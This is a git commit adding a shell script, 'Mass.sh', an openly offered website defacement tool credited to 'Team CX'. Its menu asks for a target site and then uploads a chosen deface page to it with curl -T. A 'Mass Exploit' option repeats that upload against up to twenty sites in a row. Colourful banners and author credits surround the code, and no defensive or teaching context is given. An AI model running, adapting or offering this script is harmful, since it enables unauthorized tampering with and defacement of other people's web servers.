b6f4bc28125ea408b9a8ab424f692fe3f2676ecc
LOLGVH <77339814+LOLGVH@users.noreply.github.com>
2021-01-17 20:11:19 +0530

    Add files via upload

---
+++ Mass.sh
@@ -0,0 +1,220 @@
+#usr/bin/sh
+#LocalDefacer
+#_____LOLCATE_______
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+pink="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+brown="\033[31;1m"
+toilet -f mono12 -F gay "Team"  -f small "C-X"
+echo $indigo
+date
+echo $pink"___________________________________________________◆"
+echo $cyan" ["$white"+"$cyan"]Created by"	 : $yellow"ABHI~" $green"[ Team CX ]"
+echo $cyan" ["$white"+"$cyan"]Facebook   : https://www.facebook.com/profile.php?id=100012616844823"
+echo $cyan" ["$white"+"$cyan"]Github     : https://github.com/LOLGVH"
+echo $green"NOTE $brown: Choose your script from internal storage "
+echo $pink"___________________________________________________◆"
+echo $pink"	~"$white"◀"$cyan"A"$white"▶"$green".Deface"$white"		◀"$cyan"Q"$white"▶"$green"Quit "
+echo $pink"	~"$white"◀"$cyan"B"$white"▶"$green".Takescript"$white"		◀"$cyan"I"$white"▶"$green"About us "
+echo $pink"	~"$white"◀"$cyan"C"$white"▶"$green".Exploit"
+echo $purple"∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽"
+echo $pink"	~"$cyan"◀"$white"T"$cyan"▶"$yellow"Vuln Site"$cyan
+echo $purple"∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽∽"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ "  apaan
+
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo "                                          "
+figlet -f shadow Deface
+echo $pink "●Enter your target site ◆ "
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ "  target
+echo $pink "●Enter Script Name ◆"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo $pink "[+]>>>>> = $target/$script "
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+echo $yellow
+figlet -f shadow Bravo 
+echo $pink "Target input "
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ "  target
+echo $pink "Save with name?(ex: script.html)"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " Save
+curl -o $simpan $target
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "C" ] || [ $apaan = "c" ]
+then
+echo $yellow
+figlet -f small "MASS"
+echo $green
+figlet -f smshadow "EXPLOIT"
+echo $yellow"### ctrl + c to quit ###"
+echo $pink "Enter script name"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white                               
+read -p " ╰─$ " script
+echo $pink "Enter your target site"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $cyan"["$green"+"$cyan"]"$pink"$target1/$script"
+echo "Target site~2"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo $cyan"["$green"+"$cyan"]"$pink"$target2/$script"
+echo "Target site~3"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo $cyan"["$green"+"$cyan"]"$pink"$target3/$script"
+echo "Target site~4"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo $cyan"["$green"+"$cyan"]"$pink"$target4/$script"
+echo "Target site~5"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo $cyan"["$green"+"$cyan"]"$pink"$target5/$script"
+echo "Target site~6"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo $cyan"["$green"+"$cyan"]"$pink"$target6/$script"
+echo "Target site~7"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo $cyan"["$green"+"$cyan"]"$pink"$target7/$script"
+echo "Target site~8"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target8
+curl -T /storage/emulated/0/$script $target8
+echo $cyan"["$green"+"$cyan"]"$pink"$target8/$script"
+echo "Target site~9"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target9
+curl -T /storage/emulated/0/$script $target9
+echo $cyan"["$green"+"$cyan"]"$pink"$target9/$script"
+echo "Target site~10"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target10
+curl -T /storage/emulated/0/$script $target10
+echo $cyan"["$green"+"$cyan"]"$pink"$target10/$script"
+echo "Target site~11"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target11
+curl -T /storage/emulated/0/$script $target11
+echo $cyan"["$green"+"$cyan"]"$pink"$target11/$script"
+echo "Target site~12"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target12
+curl -T /storage/emulated/0/$script $target12
+echo $cyan"["$green"+"$cyan"]"$pink"$target12/$script"
+echo "Target site~13"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target13
+curl -T /storage/emulated/0/$script $target13
+echo $cyan"["$green"+"$cyan"]"$pink"$target13/$script"
+echo "Target site~14"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target14
+curl -T /storage/emulated/0/$script $target14
+echo $cyan"["$green"+"$cyan"]"$pink"$target14/$script"
+echo "Target site~15"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target15
+curl -T /storage/emulated/0/$script $target15
+echo $cyan"["$green"+"$cyan"]"$pink"$target15/$script"
+echo "Target site~16"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target16
+curl -T /storage/emulated/0/$script $target16
+echo $cyan"["$green"+"$cyan"]"$pink"$target16/$script"
+echo "Target site~17"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target17
+curl -T /storage/emulated/0/$script $target17
+echo $cyan"["$green"+"$cyan"]"$pink"$target17/$script"
+echo "Target site~18"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target18
+curl -T /storage/emulated/0/$script $target18
+echo $cyan"["$green"+"$cyan"]"$pink"$target18/$script"
+echo "Target site~19"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target19
+curl -T /storage/emulated/0/$script $target19
+echo $cyan"["$green"+"$cyan"]"$pink"$target19/$script"
+echo "Target site~20"
+echo $white "╭─"$green"ABHI@localhost"$cyan" ~/Lolsystem"$white
+read -p " ╰─$ " target20
+curl -T /storage/emulated/0/$script $target20
+echo $cyan"["$green"+"$cyan"]"$pink"$target20/$script"
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo $pink"################# INFO ####################"
+echo $indigo"__________________________________________"
+echo $green"AUTHOR : ABHI~"
+echo $green"GITHUB :"$brown" https://github.com/LOLGVH"
+echo $yellow"		  THANKS TO : "
+echo $cyan"                   ■"$yellow"■"$green"■"$pink"■"$brown"■"$indigo"■"$white"■"
+echo $cyan"[+] TEAM" $yellow"CX~"
+echo $yellow"                   Creators :"
+echo $cyan"[+] MR _TOX1C" $cyan" SCR1P7_K1DDY" $cyan" CJ_M4SK" $cyan"yedhun_jcf"
+echo $pink"################# INFO ####################"
+echo $indigo"__________________________________________"
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+cat Abhi.txt
+echo $cyan"["$yellow"B"$cyan"]"$yellow">>>>back"
+read -p "[ b ] " back             
+sh Mass.sh
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo $brown"          Bye :)     "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh Mass.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
+
+#LOLGVH copyright ©
+#author by ABHI
+#Team Lol {CX} 
